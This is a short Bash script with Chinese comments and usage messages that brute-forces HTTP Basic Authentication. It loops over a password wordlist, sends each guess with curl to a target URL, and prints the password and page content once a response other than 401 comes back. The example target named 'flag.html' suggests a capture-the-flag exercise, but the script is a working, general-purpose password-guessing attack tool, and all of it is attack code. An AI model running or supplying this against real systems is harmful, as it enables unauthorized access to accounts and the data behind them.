#!/bin/bash
# Basic Auth 暴力破解脚本
# 用法: bash basic_auth_brute.sh <目标URL> <用户名> <密码字典路径>
# 示例: bash basic_auth_brute.sh http://target.com/flag.html admin ../10_million_password_list_top_100.txt

URL="${1:?用法: $0 <URL> <用户名> <字典路径>}"
USER="${2:?用法: $0 <URL> <用户名> <字典路径>}"
DICT="${3:?用法: $0 <URL> <用户名> <字典路径>}"

echo "[*] 目标: $URL"
echo "[*] 用户名: $USER"
echo "[*] 字典: $DICT"
echo "[*] 开始爆破..."
echo ""

count=0
while IFS= read -r pass; do
    # 跳过空行
    [ -z "$pass" ] && continue
    count=$((count + 1))

    result=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$pass" "$URL")

    if [ "$result" != "401" ]; then
        echo ""
        echo "[+] 爆破成功! 第 ${count} 次尝试"
        echo "[+] 用户名: $USER"
        echo "[+] 密码: $pass"
        echo "[+] HTTP状态码: $result"
        echo "[+] 响应内容:"
        curl -s -u "$USER:$pass" "$URL"
        exit 0
    fi

    # 每10次打印一次进度
    if [ $((count % 10)) -eq 0 ]; then
        echo "[.] 已尝试 ${count} 次..."
    fi
done < "$DICT"

echo ""
echo "[-] 字典遍历完毕，未找到有效密码"
exit 1
